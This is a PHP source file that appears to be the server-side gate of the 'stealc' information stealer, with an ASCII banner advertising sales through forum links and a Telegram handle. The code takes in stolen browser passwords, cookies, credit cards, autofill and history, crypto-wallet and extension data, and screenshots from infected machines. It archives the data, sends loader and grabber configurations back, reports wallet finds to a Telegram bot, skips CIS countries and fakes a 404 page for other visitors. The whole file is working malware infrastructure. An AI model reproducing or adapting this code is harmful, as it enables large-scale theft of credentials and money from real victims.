<?php

/*
* Includes
*/
include "config.php";
include "functions.php";

include "modules/UserAgent.php";
include "modules/TelegramBot.php";


include("geoip/geoip.inc");
$gi = geoip_open("geoip/geoip.dat", GEOIP_STANDARD);

/*
* Get info about request
*/
$ip 		= getClientIP();
$iso 		= geoip_country_code_by_addr($gi, $ip)  == "" ? "UN" : geoip_country_code_by_addr($gi, $ip);
$date 		= date("Y-m-d H:i:s");
$date_file  = date("Y_m_d_H_i_s");

/*
* Read request
*/
$token 		= isset($_POST["token"])?$_POST["token"]:null;
$file_name 	= isset($_POST["file_name"])?base64_decode($_POST["file_name"]):null;
$file 		= isset($_POST["file"])?base64_decode($_POST["file"]):null;
$build 		= isset($_POST["build"])?$_POST["build"]:null;
$hwid		= isset($_POST["hwid"])?$_POST["hwid"]:null;
$message 	= isset($_POST["message"])?$_POST["message"]:null;

/**
 * getClientIP
 *
 * Check $_SERVER for found user ip
 *
 * @return IP string
 */
function getClientIP()
{
	if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER))
    {
        return  $_SERVER["HTTP_X_FORWARDED_FOR"];
    }
	else if (array_key_exists('HTTP_X_REAL_IP', $_SERVER))
    {
        return $_SERVER["HTTP_X_REAL_IP"];
    }
    else if (array_key_exists('REMOTE_ADDR', $_SERVER))
    {
        return $_SERVER["REMOTE_ADDR"];
    }
    else if (array_key_exists('HTTP_CLIENT_IP', $_SERVER))
    {
        return $_SERVER["HTTP_CLIENT_IP"];
    }
	
}

$copyright_text = "
 ______     ______   ______     ______     __         ______
/\  ___\   /\__  _\ /\  ___\   /\  __ \   /\ \       /\  ___\
\ \___  \  \/_/\ \/ \ \  __\   \ \  __ \  \ \ \____  \ \ \____
 \/\_____\    \ \_\  \ \_____\  \ \_\ \_\  \ \_____\  \ \_____\
  \/_____/     \/_/   \/_____/   \/_/\/_/   \/_____/   \/_____/

                       stealc stealer

powerful native stealer based on C lang

forum topics:
	- https://forum.exploit.in/topic/220340/
	- https://xss.is/threads/79592/
	- https://bhf.im/threads/666154/

buy:
	- telegram: t.me/plym0uth

----------------------------------------------------------------
";

/*
* CIS disabler
*/
switch ($iso)
{
	case "RU":
		exit(0);
		break;

	case "BY":
		exit(0);
		break;

	case "KZ":
		exit(0);
		break;

	case "AZ":
		exit(0);
		break;

	case "UZ":
		exit(0);
		break;
		
	case "UA":
		exit(0);
		break;
}

/*
* Create db connect
*/
$link = ConnectDB();


/*
* Upload func
*/
if(isset($token))
{
	$telegram_config = getConfigTelegramBot($link);

	if(isset($message))
	{
		switch($message)
		{
			case getConfigDoneOpcode($link):
				$log_id = getLogIdByToken($link, $token);
				$build = getBuildByLogId($link, $log_id);
				$log = getLog($link, $log_id);

				// log full uploaded
				UpdateLogStatus($link, $log_id, 2);

				// return loader tasks
				echo base64_encode(GenerateLoaderConfig($link, $build));

				$send_to_telegram = false;
				$telegram_spec    = false;
				
				if($telegram_config["bot_enable"])
				{
					if($telegram_config["bot_no_empty"])
					{
						$telegram_spec = true;
						
						if($log["count_wallets"] > 0)
						{
							$send_to_telegram = true;
						}
						
						if($log["count_passwords"] > 0)
						{
							$send_to_telegram = true;
						}
					}
					
					if($telegram_config["bot_only_crypto"])
					{
						$telegram_spec = true;
						
						if($log["count_wallets"] > 0)
						{
							$send_to_telegram = true;
						}
					}
					
					if(!$telegram_spec)
					{
						$send_to_telegram = true;
					}

					if($send_to_telegram)
					{
						Telegram_SendMessage(PANEL_DOMAIN, LOGS_PATH, $telegram_config["bot_token"], $telegram_config["bot_chatid"], $link, $log_id, "done", null, $file_name);
					}
				}
				break;

			case "plugins":
				echo base64_encode(GeneratePluginsConfig($link));
				break;

			case "browsers":
				echo base64_encode(GenerateBrowsersConfig($link));
				break;

			case "wallets":
				echo base64_encode(GenerateWalletsConfig($link));
				break;

			case "files":
				echo base64_encode(GenerateGrabberConfig($link));
				break;
		}

		exit(0);
	}
	else if(isset($file) & isset($file_name))
	{
		// get log_id by token
		$log_id = getLogIdByToken($link, $token);

		if($log_id != 0)
		{
			// get log filename
			$zip_name = getFileNameByLogId($link, $log_id);
			$zip_path = LOGS_PATH."/". basename($zip_name);
			$log_info = json_decode(getLogInfo($link, $log_id), true);

			// check file exist
			if(file_exists($zip_path))
			{
				$zip = OpenZip($zip_name);

				// change log size
				UpdateLogSize($link, $log_id, strlen($file));

				if($file_name == "system_info.txt")
				{
					
				}
				else
				{
					if(strcmp($file_name, getConfigPasswordsFile($link)) == 0)
					{
						ZipAddFile($zip, "passwords.txt", $file);
					}
					else
					{
						ZipAddFile($zip, $file_name, $file);
					}
				}

				//
				$parse_filename = explode("\\", $file_name);

				// why file
				switch($file_name)
				{
					case "system_info.txt":
						// read and add more info to db
						$system_info  	= explode("\n", $file);

						$system 		= substr($system_info[7], 7);
						$architecture 	= substr($system_info[8], 17);

						$file = str_ireplace("IP?", $ip, $file);
						$file = str_ireplace("ISO?", $iso, $file);

						UpdateLogSystemInfo($link, $log_id, $system, $architecture);
						UpdateLogSystemFile($link, $log_id, $file);
						
						$file_sysinfo .= $copyright_text;
						$file_sysinfo .= $file;
						$file = $file_sysinfo;
						
						ZipAddFile($zip, $file_name, $file);

						// parse user agents
						$log_info = CheckUserAgents($zip, $file_name, $file, $log_info, $system, $architecture);

						break;

					case getConfigPasswordsFile($link):
						// think passwords count
						$count_passwords = substr_count($file, "browser:");

						// read file line by line
						$passwords_file = explode("\n", $file);

						foreach($passwords_file as &$password)
						{
							if(substr($password, 0, 9) == "browser: ")
							{
								$browser_name = substr($password, 9);

								$log_info["browsers"][$browser_name]++;
							}
						}

						// save passwords list and pass count
						UpdateLogPasswordsCount($link, $log_id, $count_passwords);
						UpdateLogPasswords($link, $log_id, $file);
						
						// marker reader...
						$log_info = MarkerParser($link, $file, $log_info, $zip);
						
						break;

					case "screenshot.jpg":
						// update screen in db
						UpdateScreenshot($link, $log_id, 1);
						break;
				}

				// wallets?
				switch($parse_filename[0])
				{
					case "wallets":
						$log_info["wallets"][$parse_filename[1]]++;

						// update wallets count
						UpdateWalletsCount($link, $log_id);

						// update array_wallets
						UpdateWalletsArray($link, $log_id, $parse_filename[1]);

						if($telegram_config["bot_enable"])
						{
							// send telegram message
							if($telegram_config["bot_processing"])
							{
								Telegram_SendMessage(PANEL_DOMAIN, LOGS_PATH, $telegram_config["bot_token"], $telegram_config["bot_chatid"], $link, $log_id, "wallet", $parse_filename[1], $file_name);
							}
						}

						break;

					case "plugins":
						$log_info["plugins"][$parse_filename[1]]["count"]++;

						foreach(preg_split("/((\r?\n)|(\r\n?))/", $file) as $line)
						{
							$match;

							if(preg_match("CachedBalancesController\"[ :]+((?=\[)\[[^]]*\]|(?=\{)\{[^\}]*\}|\"[^\"]*\")", $line, $match))
							{
								$result = $match[0];

								$result = substr($result, 26);
								$result = substr($result, 0, -1);

								$_arr = json_decode($result, true);

								foreach($_arr["cachedBalances"] as $balance)
								{
									foreach(array_keys($balance) as $wallet)
									{
										$log_info["plugins"][$parse_filename[1]]["wallets"][$wallet]["wallet"] 	= $wallet;
										$log_info["plugins"][$parse_filename[1]]["wallets"][$wallet]["browser"] = $parse_filename[2];
										$log_info["plugins"][$parse_filename[1]]["wallets"][$wallet]["profile"] = $parse_filename[3];
										$log_info["plugins"][$parse_filename[1]]["wallets"][$wallet]["file"] 	= $file_name;
									}
								}
							}
						}

						// update wallets count
						UpdateWalletsCount($link, $log_id);

						// update array_wallets
						UpdateWalletsArray($link, $log_id, $parse_filename[1]);

						if($telegram_config["bot_enable"])
						{
							// send telegram message
							if($telegram_config["bot_processing"])
							{
								if(pathinfo($file_name, PATHINFO_EXTENSION) == "log")
								{
									Telegram_SendMessage(PANEL_DOMAIN, LOGS_PATH, $telegram_config["bot_token"], $telegram_config["bot_chatid"], $link, $log_id, "plugin", $parse_filename[1], $file_name);
								}
							}
						}

						break;

					case "cookies":
						$cookies = explode("\n", $file);
						$cookies_array = "";

						foreach($cookies as $cookie)
						{
							$tokens = explode("\t", $cookie);

							$cookies_array .= $tokens[0];
							$cookies_array .= "\n";
						}

						$log_info["cookies"][$parse_filename[1]]["name"] = $parse_filename[1];
						$log_info["cookies"][$parse_filename[1]]["size"] = strlen($file) / 1000;

						UpdateCookiesArray($link, $log_id, $cookies_array);

						// add cookie_list.txt
						ZipAddFile($zip , "cookie_list.txt", $cookies_array);

						break;

					case "autofill":
						$log_info["autofill"][$parse_filename[1]]["name"] = $parse_filename[1];
						$log_info["autofill"][$parse_filename[1]]["size"] = strlen($file) / 1000;
						break;

					case "cc":
						$log_info["cc"][$parse_filename[1]]["name"] = $parse_filename[1];
						$log_info["cc"][$parse_filename[1]]["size"] = strlen($file) / 1000;
						break;

					case "soft":
						$log_info["soft"][$parse_filename[1]]++;
						break;

					case "files":
						$log_info["files"]++;
						break;
						
					case "history":
						$log_info["history"][$parse_filename[1]]["name"] = $parse_filename[1];
						$log_info["history"][$parse_filename[1]]["size"] = strlen($file) / 1000;
						break;
				}

				CloseZip($zip);

				UpdateLogInfo($link, $log_id, json_encode($log_info));
				UpdateLogStatus($link, $log_id, 1);

				exit(0);
			}
			else
			{
				exit(0);
			}
		}
		else
		{
			exit(0);
		}
	}
	else
	{
		exit(0);
	}
}
else
{
	if(isset($hwid) & isset($build))
	{
		// check blocklist
		$ban_id = CheckBlockList($link, $hwid, $ip);
		
		if($ban_id != 0)
		{
			AddBlockCount($link, $ban_id);
			
			echo base64_encode("block");
			exit(0);
		}
		
		// check hwid duplicate block
		$hwid_block = getHwidBlock($link);
		
		if($hwid_block == 1)
		{
			$repeated = CheckLogRepeated($link, $hwid);
			
			if($repeated == 1)
			{
				echo base64_encode("block");
				exit(0);
			}
		}
		
		// create token
		$token = AddRequest($link, $ip, $iso);

		// if build found in db
		if(CheckBuild($link, $build))
		{
			// get request id
			$request_id = getRequestIdByToken($link, $token);

			// generate zip name
			$zip_name = sprintf("%s_%s_%s.zip", $iso, $ip, $date_file);

			// check log repeated
			$repeated = CheckLogRepeated($link, $hwid);

			// add null log to logs
			AddLog($link, $request_id, $build, $ip, $iso, $hwid, $zip_name, $repeated, 0);
			
			// update logs count in builds
			UpdateLogsCountByBuild($link, $build);

			// get log id
			$log_id = getLogIdByRequestId($link, $request_id);

			// update request
			UpdateRequestLogId($link, $token, $log_id);

			// create zip
			$zip = CreateZip($zip_name);
			ZipAddFile($zip, "copyright.txt", $copyright_text);
			ZipAddComment($zip, $copyright_text);

			CloseZip($zip);

			// generate bot config
			echo base64_encode(GenerateBotConfig($link, $token));
		}
		else
		{
			echo("<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">");
			echo("<html><head>");
			echo("<title>404 Not Found</title>");
			echo("</head><body>");
			echo("<h1>Not Found</h1>");
			echo("<p>The requested URL was not found on this server.</p>"); 
			echo("<hr>");
			echo("<address>".apache_get_version()." Server at ".$_SERVER['SERVER_ADDR']." Port ".$_SERVER['SERVER_PORT']."</address>");
			echo("</body></html>");
			exit(0);
		}
	}
	else
	{
		echo("<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">");
		echo("<html><head>");
		echo("<title>404 Not Found</title>");
		echo("</head><body>");
		echo("<h1>Not Found</h1>");
		echo("<p>The requested URL was not found on this server.</p>"); 
		echo("<hr>");
		echo("<address>".apache_get_version()." Server at ".$_SERVER['SERVER_ADDR']." Port ".$_SERVER['SERVER_PORT']."</address>");
		echo("</body></html>");
		exit(0);
	}
}

/*
* Disconnect
*/
CloseConnection($link);

/*
* CheckBlockList
* 
*/
function CheckBlockList($link, $hwid, $ip)
{
	$ban_id = 0;
	
	$ban_id = CheckBlockByHWID($link, $hwid);
	
	if($ban_id != 0)
	{
		return $ban_id;
	}
	
	$ban_id = CheckBlockByIP($link, $ip);
	
	if($ban_id != 0)
	{
		return $ban_id;
	}
	
	return $ban_id;
}

/*
* CheckBlockByHWID
* 
*/
function CheckBlockByHWID($link, $hwid)
{
	$ban_id = 0;
	
	$query = "SELECT `ban_id` FROM `banlist` WHERE `hwid` = ? AND `active` = 1";
	
	if ($stmt = $link->prepare($query)) 
	{
		$stmt->bind_param('s', $hwid);
		$stmt->execute();
		
		$stmt->store_result();
		
		if ($stmt->num_rows > 0)
		{
			$stmt->bind_result($ban_id);
			$stmt->fetch();
		}
	}
	
	return $ban_id;
}

/*
* CheckBlockByHWID
* 
*/
function CheckBlockByIP($link, $ip)
{
	$ban_id = 0;
	
	$query = "SELECT `ban_id` FROM `banlist` WHERE `ip` = ? AND `active` = 1";
	
	if ($stmt = $link->prepare($query)) 
	{
		$stmt->bind_param('s', $ip);
		$stmt->execute();
		
		$stmt->store_result();
		
		if ($stmt->num_rows > 0)
		{
			$stmt->bind_result($ban_id);
			$stmt->fetch();
		}
	}
	
	return $ban_id;
}

/*
* AddBlockCount
* 
*/
function AddBlockCount($link, $ban_id)
{
	$query = "UPDATE `banlist` SET `count` = `count`+1 WHERE `ban_id` = ?";
	
	if ($stmt = $link->prepare($query)) 
	{
		$stmt->bind_param('i', $ban_id);
		$stmt->execute();
	}
}

/*
* MarkerParser
* 
*/
function MarkerParser($link, $file, $log_info, $zip)
{
	$markers = $link->query("SELECT * FROM `markers` WHERE `active` = 1;");
	
	while ($marker = $markers->fetch_assoc())
	{
		$_marker = explode(',', $marker["urls"]);
		
		foreach ($_marker as $_url)
		{
			$pos = stripos($file, $_url);
			
			if ($pos !== false) 
			{
				$log_info["marker"][$_url]["count"]++;
				$log_info["marker"][$_url]["color"] = $marker["color"];

				$domain_detect .= $_url."\n";
			}
		}
	}
	
	// writing to log...
	ZipAddFile($zip, "domain_detect.txt", $domain_detect);
	
	return $log_info;
}

?>
